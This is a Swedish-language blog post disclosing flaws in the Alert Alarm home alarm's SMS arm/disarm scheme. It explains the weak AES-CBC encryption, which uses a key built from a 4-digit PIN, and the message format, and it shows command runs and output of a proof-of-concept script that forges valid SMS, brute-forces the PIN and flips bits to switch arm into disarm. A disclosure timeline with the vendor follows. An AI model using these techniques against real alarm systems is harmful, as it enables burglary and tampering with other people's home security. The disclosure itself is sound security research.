<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <title>Alert Alarm SMS exploit - Svensk version</title>
        <link rel="stylesheet" href="https://jyx.github.io/theme/css/main.css" />
        <link href="https://jyx.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="joakimbech.com Atom Feed" />

        <!--[if IE]>
            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="https://jyx.github.io/">joakimbech.com </a></h1>
                <nav><ul>
    
                        <li><a href="https://jyx.github.io/pages/about.html">About</a></li>
    
                        <li><a href="https://jyx.github.io/pages/projects.html">Projects</a></li>
                </ul>
                </nav>
<div id="submenu">
                    <ul>
                            <li><a href="https://jyx.github.io/category/coding.html">Coding</a></li>
                            <li><a href="https://jyx.github.io/category/git.html">Git</a></li>
                            <li class="active"><a href="https://jyx.github.io/category/hacking.html">Hacking</a></li>
                            <li><a href="https://jyx.github.io/category/tools.html">Tools</a></li>
                            <li><a href="https://jyx.github.io/category/woodworking.html">Woodworking</a></li>
                    </ul>
                <div>
        </header><!-- /#banner -->
<section id="content" class="body">
  <article>
    <header>
      <h1 class="entry-title">
        <a href="https://jyx.github.io/alert-alarm-exploit-se.html" rel="bookmark"
           title="Permalink to Alert Alarm SMS exploit - Svensk version">Alert Alarm SMS exploit - Svensk version</a></h1>
    </header>

    <div class="entry-content">
<footer class="post-info">
        <span>Thu 02 January 2020</span>
        	<span>| by <a class="url fn" href="https://jyx.github.io/author/joakim-bech.html">Joakim Bech</a></span>
	        <span>| in <a href="https://jyx.github.io/category/hacking.html">Hacking</a></span>
Translations:
        <a href="https://jyx.github.io/alert-alarm-exploit.html">en</a>

</footer><!-- /.post-info -->      <p>For English translation of the article please go <a class="reference external" href="alert-alarm-exploit.html">here</a>.</p>
<p>För mindre teknikintresserade personer eller för er som inte bryr sig mycket
om detaljerna räcker det förmodligen att läsa denna introduktion och sektionen
<a class="reference internal" href="#sammanfatting">Sammanfatting</a> sist i artikeln för att få ett hum om vad det rör sig om.</p>
<ul class="simple">
<li>Testat idag 2020-01-01 så är det som presenteras här fortfarande ej åtgärdat,
dvs bristerna som nämns här finns fortfarande i Alert Alarms system trots att
det rapporterades till dem den 3:e Juli 2019.</li>
<li><a class="reference external" href="https://www.alertalarm.se">Alert Alarm</a> är ett svenskt företag som säljer inbrottslarm till
privatpersoner och villaägare. På en av deras sidor kan man läsa [<a class="reference external" href="https://www.alertalarm.se/hemlarm/garanti-och-funktion.html#1">1</a>] att:
&quot;våra hemlarm kommunicerar krypterat över GSM i första hand och med SMS i
andra hand&quot;. Utöver det verkar det som att det finns en koppling mellan Alert
Alarm och <a class="reference external" href="https://www.verisure.se/">Verisure</a> eftersom de personer jag varit i kontakt med efter
första rapportering kommer från Verisure.</li>
<li>Allt började med att jag en morgon i Juni 2019 märkte att när man larmar av
från Alert Alarms app så genereras ett SMS med en (hex-)sträng, dvs en 64
tecken lång sträng med siffror och bokstäver. Efter att jag gjort lite
&quot;reverse engineering&quot; av appen så hittade jag ett flertal säkerhetssvagheter
relaterat till deras sätt att larma på/av systemet från deras Android app.
Dessa svagheter kan summeras i:<ul>
<li>Krypteringen består av ren AES-CBC som är <a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">malleable</a> (hittar ingen bra
svensk översättning), vilket innebär att man kan ändra den krypterade texten
och det slår i sin tur på den dekrypterade texten.</li>
<li>Inget integritetsskydd på skickade krypterade meddelanden (SMS'en).</li>
<li>Kraftigt reducerad nyckelrymd, från 128-bitar till att enbart använda 9999
nycklar.</li>
<li>Använder inga enhetsunika egenskaper/värden tillsammans med data som skickas
till Alert Alarm servern.</li>
<li>Det används ingen KDF (Key Derivation Function), vilket förmodligen hade
varit önskvärt i ett sånt här scenario.</li>
<li>Det används inget nyckelutbytesprotokoll (likt Diffie Hellman t.ex.) för att
komma överens om en unik krypteringsnyckel.</li>
</ul>
</li>
<li>Sammantaget gör detta att Alert Alarms system är ganska sårbart. Allt som
krävs från en illvillig person är att få tag på ett endaste krypterat
meddelande för att enkelt lista ut koden för att larma av ett hus. Antingen
kan man skicka ett manuellt skapat och fejkat &quot;larma av SMS&quot; (Google <a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;oq=send+spoofed+sms">spoofed
SMS</a>) som ser ut att komma från användaren. Eller kan en inbrottstjuv bryta
upp dörren och slå in koden undertiden som larmet räknar ner, dvs slå in koden
precis som ägaren till larmet skulle gjort.</li>
<li>På resten av denna sida finns exempel och skript som kan dekryptera Alert
Alarm SMS, skapa giltiga Alert Alarm SMS, hitta den korrekta koden för att
larma av/på genom att göra en s.k. &quot;bruteforce&quot; attack. En sådan attack tar
mindre än en sekund att utföra på Alert Alarms system. Det är även möjligt att
vända på bitar så att ett meddelande får en annan betydelse än vad var menat
till att börja med.</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<div class="section" id="observation">
<h2>Observation</h2>
<p>Som redan nämnt, detta fångade min uppmärksamhet när jag stängde av mitt hemlarm
via Alert Alarms Android app. Det skapades ett SMS enligt bilden nedan (jag har
suddat ut en del av meddelandet, annars kan vem som helst luska ut koden till
vårt hemlarm).</p>
<div class="align-center figure">
<img alt="SMS image" src="/images/alert/aa_initial_sms.png" />
</div>
<p>Efter att ha spenderat resten av morgonen med att &quot;reverse engineera&quot; SMS delen
i Alert Alarm appen kom jag from till att den 64 byte långa hexsträngen består
av två delar. Den första delen är <a class="reference external" href="https://en.wikipedia.org/wiki/Initialization_vector">IV</a>'t som är en slumpmässig hexsträng (skapas
av <tt class="docutils literal">SHA1PRNG</tt>) och den andra delen är det faktiska meddelandet.</p>
<div class="highlight"><pre><span></span>   32 bytes   32 bytes
+-----------+----------+
| IV        | Message  |
+-----------+----------+
</pre></div>
<p>Krypteringsalgoritmen som används är <a class="reference external" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_(CBC)">AES-CBC</a> med en 128-bitars nyckel. Dock
skall noteras att nyckeln är konstruerad så här:</p>
<div class="highlight"><pre><span></span>000000000000xxxx
</pre></div>
<p>Där är &quot;xxxx&quot; koden som används för att larma av/på hemlarmet. Med detta innebär
det också att man kraftigt reducerat antalet möjliga nycklar från 128-bitar till
att endast använda 9999 nycklar. Dvs istället för att använda
340282366920938463463374607431768211455 nycklar vilket är det antal nycklar man
har att välja mellan om man använt en ordentlig 128-bitars nyckel! Det är detta
som gör att bruteforce attacken bara tar en sekund att utföra.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<div class="section" id="meddelandeformat">
<h3>Meddelandeformat</h3>
<p>Formatet på de dekrypterade SMS'en är som följer:</p>
<div class="highlight"><pre><span></span>Bytes:            1   1   1      2       1     2        2        2         2          2   = 16 bytes
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
        |SMS Version| i | j | year | month-1 | day | hour | minute | user id | \x00\x00 |
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                                      (hex)
</pre></div>
<p>Här verkar det som att <tt class="docutils literal">i</tt> motsvarar <cite>0=larma av</cite> och <cite>1=larma på</cite>,
ytterligare verkar det som att <tt class="docutils literal">j</tt> indikerar om det är hemma- eller
bortatillkopplat larm som gäller.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
</div>
<div class="section" id="skript">
<h2>Skript</h2>
<p>På min GitHub sida hittar ni ett Python skript (<a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py">aaxploit.py</a>) som jag skrev
som ett &quot;proof of concept&quot; skript för att demonstrera sårbarheterna i Alert
Alarms system. Med detta skript kan man skapa giltiga Alert Alarm SMS, köra en
bruteforce attack på krypterade Alert Alarm SMS för att få tag på koden som
används för att larma av/på hemlarmet. Det finns ytterligare saker man kan göra
vilket jag kommer att beskriva mer i detalj här nedan. Om man anropar skriptet
utan argument så får man se alla möjliga parameterar, men för att göra det lite
enklare att följa med så har jag satt samman ett par exempel nedan.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<div class="section" id="skapa-ett-giltigt-alert-alarm-sms">
<h3>Skapa ett giltigt Alert Alarm SMS</h3>
<p>Detta skapar ett korrekt och giltigt Alert Alarm SMS (dvs. en hexsträng) som kan
skickas som ett vanligt SMS (eller via ett fejkat SMS, se <a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;oq=send+spoofed+sms">spoofed SMS</a>). Dvs
här kan vi skapa ett SMS för att larma på/av systemet. <tt class="docutils literal"><span class="pre">-p</span></tt> är parametern för
larmkoden du vill använda. Äger du ett Alert Alarm system, så kan du pröva detta
med din egen larmkod. Du kan pröva med antigen <tt class="docutils literal"><span class="pre">--on</span></tt> eller <tt class="docutils literal"><span class="pre">--off</span></tt> för att
larma på eller larma av larmet. Detta SMS kan du sen skicka till
+467190009972713.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py -e -p <span class="m">1234</span>
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              <span class="m">32303131393630333038343830310000</span>
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              <span class="m">30303030303030303030303031323334</span> <span class="o">(</span><span class="m">0000000000001234</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: encryption
<span class="o">[</span>INFO<span class="o">]</span>: Crafted SMS:      d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
</pre></div>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="dekryptera-ett-alert-alarm-sms">
<span id="decrypt-sms"></span><h3>Dekryptera ett Alert Alarm SMS</h3>
<p>Om du tar ett Alert Alarm SMS (64-byte hexsträng), så kan du dekryptera det
genom att mata in larmkoden som nyckel via <tt class="docutils literal"><span class="pre">-p</span></tt> parametern, <tt class="docutils literal"><span class="pre">-d</span></tt> indikerar
dekryptering och <tt class="docutils literal"><span class="pre">--input</span> &lt;sms&gt;</tt> är själv SMS'et. Här känner vi redan till
larmkoden, så detta i sig är inget säkerhetshål, men det visar att vi kan
dekryptera meddelande som en vanlig användare inte borde känna till hur man gör.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p <span class="m">1234</span>
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              <span class="m">30303030303030303030303031323334</span> <span class="o">(</span><span class="m">0000000000001234</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: decryption
<span class="o">[</span>INFO<span class="o">]</span>: <span class="p">|</span> sms_v <span class="p">|</span> i <span class="p">|</span> j <span class="p">|</span> year <span class="p">|</span> month <span class="p">|</span> day <span class="p">|</span> hour <span class="p">|</span> minute <span class="p">|</span> user_id <span class="p">|</span>
<span class="o">[</span>INFO<span class="o">]</span>:       <span class="m">2</span>   <span class="m">0</span>   <span class="m">1</span>     <span class="m">19</span>     0x6    <span class="m">03</span>     <span class="m">08</span>       <span class="m">48</span>        <span class="m">01</span>
</pre></div>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="bruteforce-attack-pa-ett-krypterat-sms">
<h3>Bruteforce attack på ett krypterat SMS</h3>
<p>Här utgår vi från att vi <strong>inte</strong> känner till korrekt nyckel (larmkod) för att
dekryptera ett SMS, men på något sätt har vi kommit över ett krypterat Alert
Alarm SMS. Genom att göra en bruteforce attack kan vi hitta korrekt
krypteringsnyckel och därmed också larmkoden som används för att larma av/på
hemlarmet. På grund av en väldigt svag och dåligt vald nyckel, så verkar det som
att denna bruteforce attack alltid fungerar. Korrekt nyckel/larmkod hittas under
mindre än en sekund.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -b
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              None <span class="o">(</span><span class="m">0000000000000000</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: bruteforce
<span class="o">[</span>INFO<span class="o">]</span>: <span class="o">(</span>Probably<span class="o">)</span> found the correct ...
<span class="o">[</span>INFO<span class="o">]</span>:    encryption key: <span class="m">30303030303030303030303031323334</span>
<span class="o">[</span>INFO<span class="o">]</span>:    pin:            <span class="m">1234</span>
</pre></div>
<p>Som vi kan se, så har vi hittat korrekt nyckel/larmkod! Notera att detta är
samma kod som används för att larma av/på hemlarmet! Dvs om en inbrottstjuv
bryter sig in så kan denna person slå denna kod precis som ägaren till huset
skulle gjort.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="andra-bitar-i-krypterade-meddelanden">
<span id="flip-bits"></span><h3>Ändra bitar i krypterade meddelanden</h3>
<p>Eftersom AES-CBC är <a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">malleable</a>, så innebär det att man kan ändra avsikten med
ursprungliga meddelandet genom att bara ändra bitar i IV't. Dvs, man kan ändra
ett &quot;larma på&quot; SMS till att bli ett &quot;larma av&quot; SMS genom att ändra väl valda
bitar. Värt att notera är att detta görs direkt på det krypterade meddelandet.
Dvs, man behöver <strong>inte</strong> dekryptera meddelandet för göra denna attack. I
exemplet nedan visar jag hur man kan ändra &quot;<tt class="docutils literal">i</tt>&quot; biten (larm av/på).</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b --flip <span class="m">112</span>
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d244e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              None <span class="o">(</span><span class="m">0000000000000000</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: flip bits
<span class="o">[</span>INFO<span class="o">]</span>: Modified IV:      d245e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Modified SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
</pre></div>
<p>Om vi t.ex. använder vårt modifierade SMS från ovan och dekrypterar det, så kan
vi se att <tt class="docutils literal">i</tt> fältet har ändrats från &quot;0&quot; till &quot;1&quot;. Jämför vi t.ex. med
meddelandet från ovan (i sektionen &quot;Dekryptera ett Alert Alarm SMS&quot;), så ser vi
att detta skett.</p>
<div class="highlight"><pre><span></span>$ ./aaxploit.py --input d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p <span class="m">1234</span>
<span class="o">[</span>INFO<span class="o">]</span>: Original SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: Msg:              ee184c8e49d04a468eabd14aee04079b
<span class="o">[</span>INFO<span class="o">]</span>: IV:               d245e98aed6f2dfbf991485e5e43cd56
<span class="o">[</span>INFO<span class="o">]</span>: Key:              <span class="m">30303030303030303030303031323334</span> <span class="o">(</span><span class="m">0000000000001234</span><span class="o">)</span>

<span class="o">[</span>INFO<span class="o">]</span>: Mode: decryption
<span class="o">[</span>INFO<span class="o">]</span>: <span class="p">|</span> sms_v <span class="p">|</span> i <span class="p">|</span> j <span class="p">|</span> year <span class="p">|</span> month <span class="p">|</span> day <span class="p">|</span> hour <span class="p">|</span> minute <span class="p">|</span> user_id <span class="p">|</span>
<span class="o">[</span>INFO<span class="o">]</span>:       <span class="m">2</span>   <span class="m">1</span>   <span class="m">1</span>     <span class="m">19</span>     0x6    <span class="m">03</span>     <span class="m">08</span>       <span class="m">48</span>        <span class="m">01</span>
                  /<span class="se">\</span>
                  <span class="p">|</span>----- changed from <span class="m">0</span> to <span class="m">1</span>
</pre></div>
<p>Notera att man kan ändra vilket bit som helst, dvs det är förmodligen möjligt
att ta ett gammalt och giltigt Alert Alarm SMS och ändra datum/klockslag till
&quot;nu&quot; och skicka detta meddelande igen.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
</div>
<div class="section" id="andra-attacker">
<h2>Andra attacker?</h2>
<ul class="simple">
<li>Är Alert Alarm systemet mottagligt för <a class="reference external" href="https://en.wikipedia.org/wiki/Replay_attack">replay attacks</a>? Dvs kan man
framgångsrikt skicka samma SMS mer än en gång?<ul>
<li>Nej, denna attack fungerar inte. Om man skickar samma SMS två gånger, säger
larmenheten &quot;Fjärrkontroll, felkod 2&quot;. Även om man lägger till en minut till
meddelandet, så fungerar det ändå inte. Förmodligen gör man någon kontroll
på serversidan hos Alert Alarm. Man gör förmodligen någon typ av
hash-kontroll eller rent av kontrollerar att ett SMS inte är för gammalt.</li>
</ul>
</li>
<li>Kommer Alert Alarms SMS server att detektera bruteforce attacker? Dvs, kan en
godtycklig person skicka 9999 SMS under en inte allt för lång tidsperiod utan
att Alert Alarm detekterar det? Om det inte detekteras innebär det att alla
Alert Alarm ägare kan bli attackerade!<ul>
<li>Jag har inte fått detta bekräftat av Alert Alarm / Verisure. Men det är
absolut något man kan pröva om man har tid och lust.</li>
</ul>
</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="oppna-fragor">
<h2>Öppna frågor</h2>
<p>Jag undrar varför Alert Alarm valt att använda SMS för att larma av/på systemen
när det redan finns en datakoppling till appen (och 2019 har väl alla
datauppkoppling?)? Det går inte göra ett vettigt nyckelutbyte (Diffie Hellman)
när man bara kommunicerar på ett håll. Med datakopplingen hade man åtminstone
kunnat göra det på ett bättre sätt. Nuvarande lösning innebär förmodligen att
det fungerar i stil med detta:</p>
<ul class="simple">
<li>Alert Alarm SMS'et skickas till deras server.</li>
<li>Servern dekrypterar SMS'et, kontrollerar parameterarna och skickar vidare
kommandot, dvs larma av/på (via datauppkopplingen över GSM) till larmägarens
huvudenhet som kontrollerar larmet.</li>
<li>När hemlarmet ändrat status så får Android appen en notifiering som bekräftar
larmets nya status.</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="kontakt-med-alert-alarm-verisure">
<h2>Kontakt med Alert Alarm / Verisure</h2>
<ul class="simple">
<li><strong>3:e Juli 2019</strong>: Jag rapporterar via Alert Alarms support sida att jag har
hittat svagheter/säkerhetshål i deras larmlösning.</li>
<li><strong>9:e Juli 2019</strong>: Ännu inget svar, så jag rapporterar detsamma som ett privat
meddelande till Alert Alarm via Facebook.</li>
<li><strong>10:e Juli 2019</strong>:<ul>
<li>Alert Alarm svarar via Facebook att de har skickat vidare min
kontaktinformation till de som utvecklar appen.</li>
<li>Verisure's Information Security Mangager försöker nå mig, först via telefon,
sen via email.</li>
<li>Jag skickar över rapporten (i princip denna blog post) tillsammans med
&quot;proof of concept&quot; skriptet.</li>
</ul>
</li>
<li><strong>12:e Augusti 2019</strong>: Telefonmöte med Verisure, jag får en statusuppdatering
och Verisure meddelar ett de behöver mer än standard 90-dagars &quot;yppande-tid&quot;
(eng. disclosure time) vilket jag är med på.</li>
<li><strong>2:a Oktober 2019</strong>: Jag hör av mig till Verisure och efterfrågar
uppdateringar. Meddelandet jag får är att de fortfarande arbetar på en
lösning och att de håller på att testa något som skall fungera. De lovar att
återkomma inom kort. Jag ställer frågan om vi skall skapa CVE nummer för
detta, jag får inget direkt svar på det.</li>
<li><strong>4:e November 2019</strong>: Jag hör av mig till Verisure igen för att höra hur det
går.</li>
<li><strong>7:e November 2019</strong>: Verisure svarar i princip med samma meddelande som 2:a
Oktober och lovar att återkomma inom kort.</li>
<li><strong>1:a Januari 2020</strong>: Jag summerar och renskriver denna blog och publicerar
allt. Anledningen att jag gör det denna dag är att det är ett halvår sen jag
rapporterade säkerhetshålen och hade man menat allvar med att lösa dem, så
hade man både löst problemen vid det här laget samt återkopplat bättre till
mig.</li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
</div>
<div class="section" id="sammanfatting">
<h2>Sammanfatting</h2>
<p>Säkertheten i Alert Alarms lösning bygger</p>
<ol class="arabic simple">
<li>Larmkoden och</li>
<li>och SMS anvsändarens telefonnummer och</li>
<li>att ingen kan på något sätt få tag på en annan persons Alert Alarm SMS.</li>
</ol>
<p>Faktum är det att man kan argumentera att säkerheten endast hänger på &quot;3&quot;
eftersom det är trivialt att ta reda på larmkoden om man har ett SMS (det är var
bruteforce attacken i <cite>aaxploit.py</cite> gör). Gällande &quot;2&quot;, så finns telefonnummer
tillgängligt överallt (hitta.se, eniro.se etc), dvs det är inte svårt att få
reda på en persons mobiltelefonnummer.</p>
<p>Alert Alarm verkar ha försökt &quot;låsa&quot; deras SMS service till specifika användare,
dvs larmägaren måste lägga till sig eget och andra personers mobiltelefonnummer
i hushållet i appen för att de skall kunna larma av/på systemet. Så vid första
anblick verkar det som att det är endast dessa person som kan slå av/på larmet,
men faktum är att det finns många tjänster på internet som erbjuder folk att
skicka fejkade SMS, dvs SMS som ser ut att komma från ett specifikt
telefonnummer (sök efter <a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;oq=send+spoofed+sms">spoofed SMS</a>). Dvs det är fullt möjligt att skapa
ett giltigt Alert Alarm SMS m.ha. <a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py">aaxploit.py</a> och sen använda någon av dessa
tjänster för att skicka ett fejkat men giltigt SMS för att antingen stänga av
eller slå på en annan persons hemlarm. Allt detta utan larmägarens vetskap.</p>
<p><strong>Skall Alert Alarm ägare vara oroliga?</strong> Att få tag på ett Alert Alarm SMS från
någon annan är förmodligen inte helt lätt, men å andra sidan inte heller
omöjligt. Olåsta mobiltelefoner från kollegor på jobb? Skriva en helt annan
Android app som kan läsa SMS osv. Sen vet vi inte heller om Alert Alarm
detekterar en bruteforce attack på serversidan som tar emot SMS. <strong>Om</strong> de
<strong>inte</strong> detekterar en sådan attack, då är det ganska enkelt att attackera vem
som helst som äger ett Alert Alarm system.</p>
<p>I vilket fall som helst, svagheterna/säkerhetshålen jag hittat är ganska
allvarliga och ger en illvillig person flera möjligheter att attackera deras
system. Detta är attacker som inte borde vara möjliga att göra på ett
larmsystems som är tänkt att skydda våra hem från inbrott. Jag och andra kunder
vill inte att vårt larmsystem har sådana här svagheter. Nuvarande lösning är vad
man på engelska ofta säger &quot;<a class="reference external" href="https://en.wikipedia.org/wiki/Security_through_obscurity">Security by Obscurity</a>&quot;.</p>
</div>
<div class="section" id="om-mig">
<h2>Om mig</h2>
<p>Jag heter Joakim Bech och har jobbat med säkerhet för embedded devices de
senaste 12 åren. Det som beskrivs i denna artikel har jag gjort på min fritid,
men i övrigt så leder jag teamet som jobbar med säkerhet på företaget <a class="reference external" href="https://www.linaro.org/">Linaro</a>
där jag varit anställd sen lite mer än sex år tillbaka.</p>
</div>

    </div><!-- /.entry-content -->

  </article>
</section>
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>blogroll</h2>
                        <ul>
                            <li><a href="http://getpelican.com">Pelican</a></li>
                            <li><a href="https://linaro.org">Linaro</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>
                            <li><a href="https://jyx.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

                            <li><a href="https://www.linkedin.com/in/jbech">linkedin</a></li>
                            <li><a href="https://github.com/jbech-linaro">github</a></li>
                            <li><a href="https://twitter.com/Jyxxan">twitter</a></li>
                            <li><a href="https://www.facebook.com/Jyxxan">facebook</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <p>Powered by <a href="http://getpelican.com/">Pelican</a>. Theme <a href="https://github.com/blueicefield/pelican-blueidea/">blueidea</a>, inspired by the default theme.</p>
        </footer><!-- /#contentinfo -->

</body>
</html>